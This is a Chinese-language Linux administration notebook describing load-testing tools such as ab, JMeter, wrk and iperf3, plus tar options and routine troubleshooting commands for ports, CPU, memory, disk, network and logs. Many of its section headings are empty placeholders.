## 二、压力测试

### 系统压力测试

#### ab

```bash
ab全称为apache benchmark是apache自带的一个性能测试工具，位于apache安装目录下的bin目录下
ab的原理：ab命令会创建 多个并发 访问线程，模拟 多个访问者 同时对某一 URL地址 进行访问。
它的测试目标是基于URL的，因此，它既可以用来测试apache的负载压力，也可以测试nginx、lighthttp、tomcat、IIS等其它Web服务器的压力。
ab是一个命令行工具， ab命令对发出负载的计算机要求很低，它既不会占用很高CPU，也不会占用很多内存。但却会给目标服务器造成巨大的负载，其原理类似CC攻击。自己测试使用也需要注意，否则一次上太多的负载。可能造成目标服务器资源耗完，严重时甚至导致死机。
yum -y install httpd-tools
# 通过 ab -h 可以查看所有命令参数，下面常用的参数进行说明：
# -n和-t一次只能使用一个

-n requests     Number of requests to perform          //在测试会话中所执行的请求个数（请求总数）。默认时，仅执行一个请求
-c concurrency  Number of multiple requests to make    //一次产生的请求个数（并发数） 默认是一次一个
-t timelimit    Seconds to max. wait for responses     //测试所进行的最大秒数。其内部隐含值是-n 50000。它可以使对服务器的测试限制在一个固定的总时间以内。默认时，没有时间限制。
-p postfile     File containing data to POST           //包含了需要POST的数据的文件.
-T content-type Content-type header for POSTing        //POST数据所使用的Content-type头信息。
-v verbosity    How much troubleshooting info to print //设置显示信息的详细程度 - 4或更大值会显示头信息， 3或更大值可以显示响应代码(404, 200等), 2或更大值可以显示警告和其他信息。
-V 显示版本号并退出。
-w              Print out results in HTML tables       //以HTML表的格式输出结果。默认时，它是白色背景的两列宽度的一张表。
-i              Use HEAD instead of GET                // 执行HEAD请求，而不是GET

#结果说明
Server Software：表示被测试的Web服务器软件名称。
Server Hostname：表示请求的URL主机名。
Server Port：表示被测试的Web服务器软件的监听端口。

Document Path：表示请求的URL中的根绝对路径，通过该文件的后缀名，我们一般可以了解该请求的类型。
Document Length：表示HTTP响应数据的正文长度。

Concurrency Level：表示并发用户数，这是我们设置的参数之一。
Time taken for tests：表示所有这些请求被处理完成所花费的总时间。
Complete requests：表示总请求数量，这是我们设置的参数之一。
Failed requests：表示失败的请求数量，这里的失败是指请求在连接服务器、发送数据等环节发生异常，以及无响应后超时的情况。如果接收到的HTTP响应数据的头信息中含有2XX以外的状态码，则会在测试结果中显示另一个名为“Non-2xx responses”的统计项，用于统计这部分请求数，这些请求并不算在失败的请求中。
Total transferred：表示所有请求的响应数据长度总和，包括每个HTTP响应数据的头信息和正文数据的长度。注意这里不包括HTTP请求数据的长度，仅仅为web服务器流向用户PC的应用层数据总长度。
HTML transferred：表示所有请求的响应数据中正文数据的总和，也就是减去了Total transferred中HTTP响应数据中的头信息的长度。
Requests per second：吞吐率，也叫QPS，计算公式：Complete requests/Time taken for tests
Time per request：用户平均请求等待时间，从用户角度看，完成一个请求所需要的时间。计算公式：Time taken for tests/Complete requests。
Time per requet(across all concurrent request)：服务器完成一个请求的时间，计算公式：Time taken for tests/（Complete requests/Concurrency Level），正好是吞吐率的倒数。也可以这么统计：Time per request/Concurrency Level。
Transfer rate：表示网络传输速度，计算公式：Total trnasferred/ Time taken for tests，这个统计很好的说明服务器的处理能力达到极限时，其出口宽带的需求量。对于大文件的请求测试，这个值很容易成为系统瓶颈所在。要确定该值是不是瓶颈，需要了解客户端和被测服务器之间的网络情况，包括网络带宽和网卡速度等信息。

Percentage of requests served within a certain time（ms）：
这部分数据用于描述每个请求处理时间的分布情况，比如以上测试，80%的请求处理时间都不超过2ms，这个处理时间是指前面的Time per request，即对于单个用户而言，平均每个请求的处理时间。

Connection Times (ms)：
这几行组成的表格主要是针对响应时间也就是第一个Time per request进行细分和统计。一个请求的响应时间可以分成网络链接（Connect），系统处理（Processing）和等待（Waiting）三个部分。表中min表示最小值； mean表示平均值；[+/-sd]表示标准差（Standard Deviation） ，也称均方差（mean square error），表示数据的离散程度，数值越大表示数据越分散，系统响应时间越不稳定。 median表示中位数； max当然就是表示最大值了。
```



#### jmeter

jmeter能够对HTTP、webservice和FTP服务器进行压力和性能测试，也可以对任何数据库进行同样的测试(通过JDBC);支持可视化;输出格式丰富



jmeter依赖Java环境，安装jmeter之前先安装Java

```bash
下载安装包
#官网地址：http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html
#解压
tar -zxvf jdk-xxx.tar.gz  -C /path
chown -R root.root jdkxxx
ln -s jdkxxx java

#配置环境变量
vim /etc/profile
#在文件末尾添加一下内容：
#java环境变量添加
export JAVA_HOME=/path/to/file
export JRE_HOME=${JAVA_HOME}/jre
export PATH=${JAVA_HOME}/bin:$PATH

# 保存之后使修改的配置生效
source /etc/profile

#验证安装是否成功
java -version

# jdk升级：先下载新版本的jdk，解压完以后删除原先的软链接，重建软链接到新jdk上
```



jmeter安装

```bash
#下载安装包
wget https://dlcdn.apache.org//jmeter/binaries/apache-jmeter-xxx.tar.gz

#解压软件包
tar -zxvf apache-jmeter-xxx.tzr.gz
ln -s apache-jmeter-xxx jmeter

#配置环境变量
vim /etc/profile
#添加如下内容到profile文件最后
#jmeter环境变量设置
export JMETER=/opt/jmeter
export PATH=${JMETER}/bin:$PATH

#验证安装是否成功
jmeter -v
```



使用方法

```bash
jmeter -n -t [测试计划.jmx] -l [结果文件.jtl] -e -o [报告目录]
参数说明：
　　-h 帮助 -> 打印出有用的信息并退出
　　-n 非 GUI 模式 -> 在非 GUI 模式下运行 JMeter
　　-t 测试文件 -> 要运行的 JMeter 测试脚本文件
　　-l 日志文件 -> 记录结果的文件
　　-j 日志文件 -> JMeter运行日志路径
　　-r 远程执行 -> 启动远程服务
　　-R 指定远程执行的服务器 -> 指定要启动的远程服务器列表
　　-H 代理主机 -> 设置 JMeter 使用的代理主机
　　-P 代理端口 -> 设置 JMeter 使用的代理主机的端口号
　　-u 代理用户名 -> 设置 JMeter 使用的代理用户名
　　-a 代理密码 -> 设置 JMeter 使用的代理认证密码
```



#### wrk

wrk是一款针对http协议的基准测试工具，它能够在单机多核CPU的条件下，使用系统自带的高性能 I/O机制，如epoll,kqueue等，通过多线程和事件模式，对目标机器产生大量的负载。



安装依赖

```bash
# 安装编译依赖
yum install -y git gcc make openssl-devel

#安装LuaJIT(wrk依赖)
git clone https://luajit.org/git/luajit.git
cd LuaJIT-xxx
make && make install

# 验证安装
luajit -v
```



安装wrk

```bash
# 获取源码
git clone https://github.com/wg/wrk.git
cd wrk
make -j 2 #使用2C进行编译
./wrk -v #验证编译成功

#设置到系统路径
cp wrk /usr/local/bin/
chmod +x /usr/local/bin/wrk
wrk -v #验证安装
```



使用方法

```bash
wrk [options] <url>
选项说明：
    -t/--threads 指定使用的线程数，通常设置为 CPU 核心数
    -c/--connections 保持打开的 HTTP 连接数，低延迟服务：连接数 = 线程数 × 10~100；高延迟服务：连接数 = 线程数 × 100~1000
    -d/--duration 测试持续时间（可加后缀 s/m/h）
    -s/--script 指定 LuaJIT 脚本路径
    -H/--header 添加 HTTP 头（可多次使用）
    -L/--latency 打印详细的延迟统计	
    -R/--rate 设置请求/秒的目标速率
```



### 网卡压力测试

#### iperf/iperf3

基于TCP/IP和UDP/IP的网络性能测试工具，它可以用来测量网络带宽和网络质量，还可以提供网络延迟抖动、数据包丢失率、最大传输单元等统计信息。



安装

```
# wget http://downloads.es.net/pub/iperf/iperf-xxx.tar.gz
# tar zxvf iperf-xxx.tar.gz

# cd iperf-xxx
# ./configure
# make
# make install

yum -y install iperf3/apt-get install iperf3
```



使用方法

```
iperf [-s|-c host] [opts]  [args]
#服务器或客户端通用选项:
  -p, --port      #         服务器监听/连接的端口号
  -f, --format    [kmgKMG]  报告格式: Kbits, Mbits, KBytes, MBytes
  -i, --interval  #         定期带宽报告之间的时间间隔(秒)
  -F, --file name           传输/接收指定的文件
  -A, --affinity n/n,m      设置CPU亲和性
  -B, --bind      <host>    绑定到特定的网络接口
  -V, --verbose             更详细的输出
  -J, --json                以JSON格式输出
  --logfile f               将输出发送到日志文件
  --forceflush              强制在每个时间间隔刷新输出
  -d, --debug               输出调试信息
  -v, --version             显示版本信息并退出
  -h, --help                显示此帮助信息并退出

#服务器特定选项:
  -s, --server              以服务器模式运行
  -D, --daemon              将服务器作为守护进程运行
  -I, --pidfile file        写入PID文件
  -1, --one-off             处理一个客户端连接后退出

#客户端特定选项:
  -c, --client    <host>    以客户端模式运行，连接到<host>
  -u, --udp                 使用UDP而不是TCP
  -b, --bandwidth #[KMG][/#] 目标带宽(bits/sec)(0表示无限制)
                            (UDP默认为1 Mbit/sec，TCP无限制)
                            (可选的斜杠和数据包计数用于突发模式)
  --fq-rate #[KMG]          启用基于公平队列的套接字速率控制(bits/sec)(仅Linux)
  -t, --time      #         传输时间(秒)(默认10秒)
  -n, --bytes     #[KMG]    要传输的字节数(代替-t参数)
  -k, --blockcount #[KMG]   要传输的数据块(数据包)数量(代替-t或-n参数)
  -l, --len       #[KMG]    读写缓冲区的长度
                            (TCP默认128 KB，UDP为动态或1)
  --cport         <port>    绑定到特定的客户端端口(TCP和UDP，默认: 临时端口)
  -P, --parallel  #         要运行的并行客户端流数量
  -R, --reverse             以反向模式运行(服务器发送，客户端接收)
  -w, --window    #[KMG]    设置窗口大小/套接字缓冲区大小
  -C, --congestion <algo>   设置TCP拥塞控制算法(仅Linux和FreeBSD)
  -M, --set-mss   #         设置TCP/SCTP最大段大小(MTU - 40字节)
  -N, --no-delay            设置TCP/SCTP不延迟，禁用Nagle算法
  -4, --version4            仅使用IPv4
  -6, --version6            仅使用IPv6
  -S, --tos N               设置IP"服务类型"
  -L, --flowlabel N         设置IPv6流标签(仅Linux支持)
  -Z, --zerocopy            使用"零拷贝"方法发送数据
  -O, --omit N              忽略前n秒的数据
  -T, --title str           在每行输出前添加此字符串前缀
  --get-server-output       从服务器获取结果
  --udp-counters-64bit      在UDP测试数据包中使用64位计数器

[KMG] 表示该选项支持K/M/G后缀，分别代表千、兆、吉
```



常用命令

``` 
TCP/UDP带宽测试
server: iperf -s
client: iperf -c 192.168.1.100 [-u -b 100M]

[root@localhost ~]# iperf3 -s -V -p 8080 -i 5
[root@localhost ~]# iperf3 -c 10.50.1.209 -V -p 8080 -i 5 -l 64B -Z -t 300
```



#### qperf

用于测试TCP和UDP网络吞吐量、延迟等性能指标，可以测试网络中的服务器或客户端性能，支持多种协议和多种数据传输方式。

功能：

1.支持TCP、UDP、RDMA协议的测试。

2.支持多种数据传输方式的测试，如点对点、多点对点、一对多等。

3.支持测试吞吐量，延迟等性能指标。

4.支持同时测试多个客户端或服务器。



安装步骤：





#### netperf





## 三、系统信息与管理

### 磁盘和存储管理

#### 分区

##### fdisk

##### gdisk

##### parted



#### 文件系统操作

##### mkfs

##### mount

##### umount

##### tune2fs

##### resize2fs

##### e2fsck

##### xfs_info



#### 查看磁盘信息

##### lsblk

##### df

##### du

##### smartctl



#### 交换分区

##### swapon

##### swapoff



#### 逻辑卷管理

##### pvcreate

##### vgcreate

##### lvcreate

##### lvs

##### lvextend

##### lvreduce



### 查看系统硬件信息

#### uptime

#### dmesg

#### lspci

#### lsusb

#### lscpu

#### lsmem

#### lsdev

#### arch

#### hwinfo

#### dmidecode



### 查看系统信息

#### uname

#### hostname

#### hostnamectl

#### date

#### biosdecode



### 管理系统

#### ntp

#### chronyd

#### systemctl



### 系统监控

#### free

#### top

#### htop

#### atop

#### iotop

#### iostat

#### sysstat



## 四、文件和目录管理

### 目录操作

#### ls

#### cd

#### pwd

#### mkdir

#### rmdir

#### tree



### 文件增删改查

#### rm

#### cp

#### rsync

#### mv

#### touch

#### cat

#### more

#### less

#### head

#### tail

#### vi

#### vim



### 文件搜索和状态

#### ln

#### find

#### locate

#### which

#### stat

#### file

#### chattr

#### lsattr



### 压缩归档

#### tar

```
#命令格式
tar [opts] [filename]

主要操作模式
-c	--create	创建新的归档文件
-x	--extract / --get	从归档中提取文件
-t	--list	列出归档内容
-d	--diff / --compare	比较归档与文件系统的差异
-r	--append	向归档末尾追加文件
-u	--update	仅追加比归档中版本新的文件
-A	--catenate / --concatenate	合并多个tar归档

文件选择和排除
-C, --directory=DIR	     在处理前切换到指定目录
--exclude=PATTERN	     排除匹配模式的文件
-T, --files-from=FILE	 从文件中读取要处理的文件列表
--wildcards	             在文件名中使用通配符(默认用于排除模式)
--recursion	             递归处理目录(默认)

压缩选项
-z, --gzip	             通过gzip压缩/解压
-j, --bzip2	             通过bzip2压缩/解压
-J, --xz	             通过xz压缩/解压
-a, --auto-compress	     根据文件后缀自动选择压缩程序
--zstd	                 通过zstd压缩/解压
-Z, --compress	         通过compress压缩/解压

归档处理和验证
-f, --file=ARCHIVE	    指定归档文件名(几乎总是需要)
-v, --verbose	        详细列出处理的文件
-W, --verify	        写入后验证归档
--checkpoint[=NUMBER]	每处理NUMBER个记录显示进度
-M, --multi-volume	    创建/列出/提取多卷归档
-k, --keep-old-files	提取时不覆盖现有文件

权限和属性处理
-p, --preserve-permissions	保留文件权限(超级用户默认)
--same-owner	保留文件所有者(超级用户默认)
--no-same-owner	以当前用户身份提取文件(普通用户默认)
--mtime=DATE	设置归档中文件的修改时间
--owner=NAME / --group=NAME	指定归档中文件的所有者/组
--acls / --xattrs / --selinux	保存ACL/扩展属性/SELinux上下文

高级功能
-g, --listed-incremental=FILE	处理GNU格式的增量备份
--delete	从归档中删除文件(不能用于磁带)
--transform=EXPRESSION	使用sed表达式转换文件名
--strip-components=NUMBER	提取时去除路径前NUMBER个组件
--one-top-level[=DIR]	创建子目录避免提取松散文件
--backup[=CONTROL]	在覆盖前备份文件
```

常用命令

```
1.创建tar存档文件
格式：tar -cf archive_name.tar file1 file2 file3 ...
tar -cf file.tar /etc  # 将/etc目录中的所有文件和子目录打包成一个名为file.tar的 tar 存档文件
tar -cvf file.tar /etc # 显示命令执行的详细信息
tar -cvzf file.tar.gz /etc /  tar -cjvf file.tar.bz2 /etc  /  tar -cJvf file.tar.xz /etc # 以gzip/bzip2/xz格式创建存档文件

2.解压tar存档文件
格式：tar -xf archive_name.tar 
tar -xf file.tar
tar -xvf file.tar -C /tmp
tar -xvzf file.tar.gz  /  tar -xjvf file.tar.bz2   /  tar -xJvf file.tar.xz 

3.列出存档文件内容
格式：tar -tvf archive_name.tar
tar -tvf file.tar
tar -tzvf file.tar.gz   /   tar -tjvf file.tar.bz2   /tar -tJvf file.tar.xz

4.高级用法
tar -cvf file.tar /path/to/files/* #压缩/path/to/files目录下的所有文件和子目录，并将存档文件保存为 file.tar。但是这种解压下来的格式将是path/to/files/*
想要解压下来只有文件必须在压缩的时候就进入到目录中，再进行压缩
cd /path
tar -cvf file.tar ./* 
或者是使用-P/--absolute-names选项指定绝对路径

创建增量备份：tar -czf file.tar.gz /path/to/files
tar -czf file.tar.gz --listed-incremental=/backup/incremental_backup.snar /path/to/files
#在下一次备份时，可以使用--listed-incremental选项指定增量备份文件（例如/backup/incremental_backup.snar），以便 tar 命令仅备份与上次备份之间的更改。

```



```
格式	压缩命令	解压命令
.tar	tar -cvf file.tar dir/	tar -xvf file.tar
.tar.gz	tar -czvf file.tar.gz dir/	tar -xzvf file.tar.gz
.tar.bz2	tar -cjvf file.tar.bz2 dir/	tar -xjvf file.tar.bz2
.tar.xz	tar -cJvf file.tar.xz dir/	tar -xJvf file.tar.xz
.zip	zip -r file.zip dir/	unzip file.zip
.rar	rar a file.rar dir/	rar x file.rar
.7z	7z a file.7z dir/	7z x file.7z
```



#### gzip

#### gunzip

#### bzip2

#### bunzip2

#### xz

#### unxz

#### zip

#### unzip

#### 7z



### 文本处理

#### grep

#### awk

#### sed

#### sort

#### diff

#### wc

#### nl

#### jq

#### yq



## 五、进程管理

### 查看

#### ps

#### top

#### htop

#### atop

#### pgrep

#### watch



### 进程操作

#### pkill

#### pidof

#### kill

#### nice

#### strace

#### vmstat



### 计划任务

#### at

#### crontab



### 系统日志管理

#### journalctl

#### logrotate

#### logger

#### resyslogd

#### syslog-ng



## 六、用户管理

### 用户

#### useradd

#### usermod

#### userdel

#### passwd

#### id

#### who

#### w

#### last

#### chage





### 组

#### groupadd

#### groupmod

#### groupdel



### 权限

#### chown

#### chgrp

#### chmod

#### su

#### sudo



## 七、软件包管理

### Debian系

#### apt

#### apt-get

#### apt-cache

#### dpkg



### RHEL

#### yum

#### dnf

#### rpm



### 其他软件

#### pip

#### npm



## 八、虚拟化

### docker

### kubectl

### helm

### containerd



## 案例

### 端口占用解决完整流程

```bash
# 1. 查找占用端口的进程
lsof -i:8080
# 或
netstat -tulnlp | grep 8080

# 2. 终止进程（假设PID为1234）
kill -9 1234

# 3. 强制释放端口（如果kill后端口仍被占用）
fuser -k 8080/tcp

# 4. 验证端口是否释放
ss -tuln | grep 8080
```





### 系统资源瓶颈排查

#### CPU瓶颈

```bash
# 查看CPU使用率
top  # 按P排序
htop  # 更直观的CPU使用展示

# 查看每个CPU核心的使用情况
mpstat -P ALL 1

# 查看进程线程CPU占用
ps -Lp 1234 -o %cpu,pid,tid,comm  # 查看进程1234的线程CPU占用
```



#### 内存瓶颈

```bash
# 查看内存使用概况
free -h
vmstat 1

# 查看进程内存占用
top  # 按M排序
ps aux --sort=-%mem | head -10

# 查看内存泄漏嫌疑
valgrind --leak-check=full ./program  # C程序内存泄漏检测
jmap -histo:live 1234  # Java进程对象统计
```



#### 磁盘I/O瓶颈

```bash
# 查看磁盘I/O负载
iostat -x 1
iotop  # 按IO使用率排序进程

# 查看磁盘空间
# df -h 是最常见的磁盘查看命令。它可以显示文件系统的总大小、已用空间、可用空间和挂载点等信息。
df -h
# du命令是用于查看目录或文件占用磁盘空间的命令。
du -sh /var/* | sort -rh  # 按大小排序目录
# fdisk 命令可以显示系统中所有硬盘的分区情况，包括分区类型、容量、起始位置等信息。通过这个命令可以查看系统磁盘的物理结构和分布情况。
fdisk -l
# lsblk该命令可以列出系统中所有块设备（如硬盘、SSD 等）的信息，包括设备名称、容量、挂载点等。通过这个命令可以方便地了解系统硬件配置和磁盘分区情况。
lsblk

# 查找大文件
find / -type f -size +100M -exec du -h {} \;

# 磁盘健康检查
# smartctl命令是用于检测硬盘健康状态并显示相关信息的命令。它可以显示硬盘的温度、寿命预测、错误记录等信息。
yum/dnf search smartctl
# 由smartmontools包提供
smartctl -a /dev/磁盘名 #显示全部信息
```



### 网络问题排查

```bash
# 检查网络连接
netstat -an | grep ESTABLISHED  # 已建立连接
ss -ti  # TCP连接详情

# 抓包分析
tcpdump -i eth0 port 80 -w capture.pcap
tcpdump -r capture.pcap host 192.168.1.1

# 路由追踪
traceroute example.com
mtr example.com  # 结合ping和traceroute

# DNS排查
nslookup example.com
dig example.com
host example.com

```



### 日志分析技巧

```bash
# 实时跟踪日志
tail -f /var/log/application.log

# 查找错误日志
grep -i error /var/log/application.log
grep -iE "error|exception" /var/log/application.log

# 按时间范围过滤日志
sed -n '/2023-10-01 10:00:00/,/2023-10-01 11:00:00/p' /var/log/application.log

# 统计错误出现次数
grep -i error /var/log/application.log | wc -l

# 分析访问日志（按IP统计访问次数）
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -10
```

